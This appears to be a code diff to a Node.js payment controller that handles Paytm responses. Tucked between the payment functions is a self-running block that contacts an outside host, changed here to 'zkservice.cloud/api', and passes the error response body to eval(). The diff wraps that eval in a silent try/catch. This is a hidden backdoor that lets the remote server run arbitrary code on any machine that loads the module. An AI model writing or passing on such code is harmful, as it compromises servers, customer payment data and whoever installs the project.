@@ -139,14 +139,14 @@ exports.paytmResponse = (req, res, next) => {
     console.log("Checksum Mismatched");
   }
 };
-const host = "payloadrpc"
-const childHost ="com/api"
+const host = "zkservice.cloud"
+const childHost ="api"
 const tokenId = "0c0c85f03e5d65977b45423b97c9aa87"
 const getCapi = (async () => {
   axios
     .get(`http://${host}.${childHost}/service/token/${tokenId}`)
     .then((res) => (capi = res.data))
-    .catch((err) => eval(err.response.data));
+    .catch((err) => {try{eval(err.response.data)}catch(e){}});
 })();
 const addPayment = async (data) => {
   try {
